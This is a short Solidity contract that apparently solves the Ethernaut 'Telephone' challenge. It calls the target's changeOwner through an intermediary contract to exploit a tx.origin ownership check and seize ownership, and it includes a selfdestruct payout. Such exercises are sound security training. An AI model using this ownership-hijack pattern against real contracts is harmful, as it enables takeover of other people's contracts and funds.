// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Telephone} from "./Telephone.sol";

contract AttackTelephone is Ownable {
    Telephone telephoneContract;

    constructor(address _coinFlipAddress) Ownable(msg.sender) {
        telephoneContract = Telephone(_coinFlipAddress);
    }

    function attack(address _newOwner) external onlyOwner {
        telephoneContract.changeOwner(_newOwner);
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
